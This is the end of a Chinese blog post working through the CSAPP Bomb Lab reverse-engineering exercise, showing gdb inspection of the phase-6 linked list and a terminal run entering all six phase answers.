<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">(gdb) i r rdx</span><br><span class="line">rdx            0x8005210        134238736</span><br><span class="line">(gdb) p *134238736</span><br><span class="line">$1 &#x3D; 581</span><br><span class="line">(gdb) p *134238752</span><br><span class="line">$2 &#x3D; 563</span><br><span class="line">(gdb) p *134238768</span><br><span class="line">$3 &#x3D; 687</span><br><span class="line">(gdb) p *134238784</span><br><span class="line">$4 &#x3D; 154</span><br><span class="line">(gdb) p *134238800</span><br><span class="line">$5 &#x3D; 170</span><br><span class="line">(gdb) p *134238808</span><br><span class="line">$6 &#x3D; 134238480</span><br><span class="line">(gdb) p *134238480</span><br><span class="line">$7 &#x3D; 454</span><br></pre></td></tr></table></figure>
<p>链表节点的值为 <code>581 563 687 154 170 454</code>，由大到小排序的节点编号 <code>3 1 2 6 5 4</code> 即为第六关答案。</p>
<h2 id="最终结果"><a href="#最终结果" class="headerlink" title="最终结果"></a>最终结果</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">hey-kong@LAPTOP-9010T96A:&#x2F;mnt&#x2F;c&#x2F;ubuntu&#x2F;csapp&#x2F;bomb65$ .&#x2F;bomb</span><br><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line">which to blow yourself up. Have a nice day!</span><br><span class="line">I am just a renegade hockey mom.</span><br><span class="line">Phase 1 defused. How about the next one?</span><br><span class="line">0 1 1 2 3 5</span><br><span class="line">That&#39;s number 2.  Keep going!</span><br><span class="line">1 171</span><br><span class="line">Halfway there!</span><br><span class="line">13 3</span><br><span class="line">So you got that one.  Try this one.</span><br><span class="line">5 115</span><br><span class="line">Good work!  On to the next...</span><br><span class="line">3 1 2 6 5 4</span><br><span class="line">Congratulations! You&#39;ve defused the bomb!</span><br></pre></td></tr></table></figure>
<h2 id="repo"><a href="#repo" class="headerlink" title="repo"></a>repo</h2><p><a target="_blank" rel="noopener" href="https://github.com/hey-kong/csapp">My solutions to CSAPP labs</a></p>
</div></article></div><nav class="pagination" role="navigation" aria-label="pagination"><div class="pagination-previous"><a href="/page/6/">上一页</a></div><div class="pagination-next"><a href="/page/8/">下一页</a></div><ul class="pagination-list is-hidden-mobile"><li><a class="pagination-link" href="/">1</a></li><li><span class="pagination-ellipsis">&hellip;</span></li><li><a class="pagination-link" href="/page/6/">6</a></li><li><a class="pagination-link is-current" href="/page/7/">7</a></li><li><a class="pagination-link" href="/page/8/">8</a></li></ul></nav></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/img/dog.jpg" alt="Iggie Wang (王亮)"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">Iggie Wang (王亮)</p><p class="is-size-6 is-block">WNLO, HUST</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Wuhan, China</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">24</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">0</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">11</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/hey-kong" target="_blank" rel="noopener">关注我</a></div></div></div><!--!--><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://github.com/hey-kong" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Github</span></span><span class="level-right"><span class="level-item tag">github.com</span></span></a></li><li><a class="level is-mobile" href="iggiewang@gmail.com" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Email</span></span><span class="level-right"><span class="level-item tag">iggiewang@gmail.com</span></span></a></li></ul></div></div></div><!--!--><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-02-05T13:18:11.000Z">2022-02-05</time></p><p class="title"><a href="/2022/02/05/etcd-%E8%AF%BB%E5%86%99%E6%A6%82%E8%BF%B0/">etcd 读写概述</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-01-30T06:51:44.000Z">2022-01-30</time></p><p class="title"><a href="/2022/01/30/k8s-in-action%E2%80%94Pod/">k8s in action—Pod</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-01-26T13:27:39.000Z">2022-01-26</time></p><p class="title"><a href="/2022/01/26/CentOS7-6%E9%83%A8%E7%BD%B2k8s/">CentOS7.6部署k8s</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-01-20T08:37:05.000Z">2022-01-20</time></p><p class="title"><a href="/2022/01/20/Docker-%E7%AE%80%E8%BF%B0/">Docker 简述</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-10-01T06:46:46.000Z">2021-10-01</time></p><p class="title"><a href="/2021/10/01/ALEX-An-Updatable-Adaptive-Learned-Index/">ALEX: An Updatable Adaptive Learned Index</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2022/02/"><span class="level-start"><span class="level-item">二月 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/01/"><span class="level-start"><span class="level-item">一月 2022</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/10/"><span class="level-start"><span class="level-item">十月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/09/"><span class="level-start"><span class="level-item">九月 2021</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/08/"><span class="level-start"><span class="level-item">八月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/07/"><span class="level-start"><span class="level-item">七月 2021</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/05/"><span class="level-start"><span class="level-item">五月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/04/"><span class="level-start"><span class="level-item">四月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/03/"><span class="level-start"><span class="level-item">三月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/02/"><span class="level-start"><span class="level-item">二月 2021</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/01/"><span class="level-start"><span class="level-item">一月 2021</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/CSAPP/"><span class="tag">CSAPP</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Cache/"><span class="tag">Cache</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Database/"><span class="tag">Database</span><span class="tag">6</span></a></div><div class="control"><a class="tags has-addons" href="/tags/File-System/"><span class="tag">File System</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Key-Value-Store/"><span class="tag">Key-Value Store</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Learned-Index/"><span class="tag">Learned Index</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/RDMA/"><span class="tag">RDMA</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Rocksdb/"><span class="tag">Rocksdb</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/docker/"><span class="tag">docker</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/etcd/"><span class="tag">etcd</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/k8s/"><span class="tag">k8s</span><span class="tag">2</span></a></div></div></div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">订阅更新</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="订阅"></div></div></form></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/">Iggie Wang&#039;s Cyberspace</a><p class="is-size-7"><span>&copy; 2022 王亮</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdnjs.loli.net/ajax/libs/jquery/3.3.1/jquery.min.js"></script><script src="https://cdnjs.loli.net/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script><script src="https://cdnjs.loli.net/ajax/libs/clipboard.js/2.0.4/clipboard.min.js" defer></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/cookieconsent/3.1.1/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "此网站使用Cookie来改善您的体验。",
          dismiss: "知道了！",
          allow: "允许使用Cookie",
          deny: "拒绝",
          link: "了解更多",
          policy: "Cookie政策",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.8/js/lightgallery.min.js" defer></script><script src="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><script type="text/x-mathjax-config">MathJax.Hub.Config({
            'HTML-CSS': {
                matchFontHeight: false
            },
            SVG: {
                matchFontHeight: false
            },
            CommonHTML: {
                matchFontHeight: false
            },
            tex2jax: {
                inlineMath: [
                    ['$','$'],
                    ['\\(','\\)']
                ]
            }
        });</script><script src="https://cdnjs.loli.net/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" defer></script><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
        });</script></body></html>